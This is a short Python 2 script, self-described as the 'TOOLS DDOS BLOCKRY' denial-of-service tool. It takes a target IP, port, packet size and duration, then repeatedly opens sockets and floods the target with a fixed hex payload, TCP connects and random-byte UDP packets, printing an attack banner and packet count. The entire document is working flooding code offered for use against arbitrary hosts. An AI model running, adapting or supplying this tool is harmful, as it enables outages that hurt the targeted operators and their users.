import socket, random, time, os, sys

if len(sys.argv) < 5:
        print " TOOLS DDOS BLOCKRY "
        print " TOOLS INI DI BUILD BY BLOCKRY"
        sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
t1m3 = int(sys.argv[4])
timeout = time.time() + t1m3
sent = 0
data = 'f1a525da11f6'.decode('hex')
while True:
        try:
                if time.time() > timeout:
                        break
                else:
                        pass
                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
                syn = socket.socket()      
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                if port == "0":
                        port = random.randrange(1, 65535)
                s.connect((ip, port))
                s.send(data)
                bytes = random._urandom(size)
                syn.connect((ip, port))
                udp.sendto(bytes,(ip, port))
                sent = sent + 1
                print " TOK......TOK.....PAKETS BY BLOCKRY ATTACKING TO IP: %s | PORT: %s | SIZE: %s | TIME: %s | PAKETS: %s"%(ip, port, size, t1m3, sent)
				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
        except KeyboardInterrupt:
                print " Stopping!"
                sys.exit()
        except socket.error, msg:
                print "Socket Couldn't Connect"
                sys.exit()